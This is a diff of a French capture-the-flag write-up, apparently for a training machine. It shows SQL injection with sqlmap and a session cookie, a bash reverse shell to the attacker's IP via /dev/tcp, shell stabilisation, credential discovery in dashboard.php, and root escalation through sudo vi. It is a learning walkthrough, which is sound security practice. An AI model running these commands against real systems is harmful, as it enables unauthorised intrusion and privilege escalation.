@@ -100,7 +100,7 @@ Une injection sql évidement car j'ai etait orienter vers ca mais comment procé
 
 Dur dur une commande m'a était transmise pour faire un sqlmap
 ```bash
-sqlmap -u 'http://[Ip de la cible]/dashboard.php?search=any+query' --cookie="PHPESSID=[valeur du cookie obtenue via cookie editor extension mozzila]"
+sqlmap -u 'http://[Ip de la cible]/dashboard.php?search=any+query' --cookie="PHPSESSID=[valeur du cookie obtenue via cookie editor extension mozzila]"
 ```
 
 Puis on retape la même chose avec:
@@ -113,17 +113,71 @@ Puis on ouvre un ncat sur le port 443:
 nc -lvnp 443
 ```
 
-Et finalement on envoi une commande qui nous permettra d'obetnir un shell stable:
+Et finalement on envoi une commande qui nous permettra d'obetnir un shell:
 
 ```bash
 bash -c bash -i >& /dev/tcp/[mon adress ip]/443 0>&1
 ```
 
-Maintenant que je suis connecter je peut faire un:
+Tout de suite on envoi une commande dans la fenetre pour pouvoir avoir ce shell stable:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+
+Maintenant que celui est stble je tente:
 ```bash
 sudo -l 
 ```
-Pour obetnir la réponse a la question qui est :
-```bash
 
+Ca ne fonctioone pas car je n'ai pas encore le code sudo de ce user. Je part en direction de `/var/www.hmtl`, je remonte les dossier un a un au cas je pourrais tomber sur un fichier intéréssant et par chance c'est le cas le tombe sur le `user.txt` dans le repo postgres je le cat et obtiens le user flag.<br/>
+Je continue mon chemin rien d'intéréssant jusqu'a ce que j'arrive dans le dossier voulu. Arriver la je cat chaque fichier pour voir si il n'y a pas une information intéréssante. <br/>
+Une fois arriver le tour de `dashboard.php` le password du user postgres est afficher sous mes yeux 😈😈😈 <br/><br/>
+
+Je vais enfin pouvoir avoir une connection stable qui ne sera pas déconnecter toutes les 2 minute 😭 c'était dur!!<br/>
+
+Je me connecte donc en ssh:
+
+```bash
+ssh postgres@[ip de la cible]
+
+//prompt de password je rentre donc ce que je viens de trouver et partons à la recherche des deux dernére info demander.
 ```
+
+Je peut maintenant faire un `sudo -l` car j'ai le mots de passe je m'y met pour obetnir la réponse a la question qui est :
+```bash
+vi
+```
+
+## Task 8 - Task 9
+
+### USER AND ROOT FLAG
+User obtenue au cour de mon exploration pour le mot de passe de postgres 
+Voyons voir maintenant comment escalader les privilége pour obtenir le mot de passe root ou une facon de le contourner pour aller chercher le root flag.<br/><br/>
+
+Incroyable ce qui viens de ce passer un nouveau truc! On peut escalader les privilége en tapant des commande depuis un fichier!<br/>
+
+Il s'avére qu'une seul commande etait disponible en sudo `/bin/vi`, <br/>
+Et ceci sur un seul fichier!! `/etc/postgresql/11/main/pg_hba.conf`. <br/><br/>
+
+Aprés quelque recherche je comprend qu'il faut que je set un shell depuis cette commande mais comment faire??? 🤯
+
+C'est clairement grace au walktrough encore du nouveau et j'adore ca!<br/>
+J'apprend qu'il faut que je set le shell depuis l'intérieur du seul fichier que je peut editer! Pétage de crane a ouai ? <br/>
+Je lance:
+```bash
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+Rentre le code du user. Puis:
+```bash
+: [enter]
+:set shell:/bin/sh
+:shell
+```
+Et comme par magie on a accés a un shell! Et en tapant:
+```bash
+whoami
+```
+On voit que l'on est root.
+Plus qu'a prendre ce root flag... Dur dur de ne pas avoir trouver mais on en apprend tout les jours.
